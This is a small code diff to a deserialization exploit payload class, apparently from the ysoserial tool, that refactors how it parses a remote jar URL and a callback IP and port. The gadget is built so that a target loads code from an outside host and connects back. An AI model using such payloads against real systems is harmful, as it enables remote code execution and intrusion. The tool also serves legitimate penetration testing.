@@ -26,12 +26,12 @@ import ysoserial.payloads.util.Reflections;
 @Authors({ Authors.FROHOFF })
 public class CommonsCollections3ForLoadJar extends PayloadRunner implements ObjectPayload<Object> {
 
-	public Object getObject(final String ipAndHost) throws Exception {
+	public Object getObject(final String ... ipAndHost) throws Exception {
         // http://127.0.0.1:8080/R.jar;127.0.0.1:4444
-        String payloadUrl = ipAndHost.substring(0,ipAndHost.indexOf(";"));
+        String payloadUrl = ipAndHost[0].substring(0,ipAndHost[0].indexOf(";"));
 
-        String ip2 = ipAndHost.substring(ipAndHost.indexOf(";")+1,ipAndHost.lastIndexOf(":"));
-        Integer port2 = Integer.parseInt(ipAndHost.substring(ipAndHost.lastIndexOf(":")+1));
+        String ip2 = ipAndHost[0].substring(ipAndHost[0].indexOf(";")+1,ipAndHost[0].lastIndexOf(":"));
+        Integer port2 = Integer.parseInt(ipAndHost[0].substring(ipAndHost[0].lastIndexOf(":")+1));
         // inert chain for setup
         final Transformer transformerChain = new ChainedTransformer(
             new Transformer[] { new ConstantTransformer(1) });
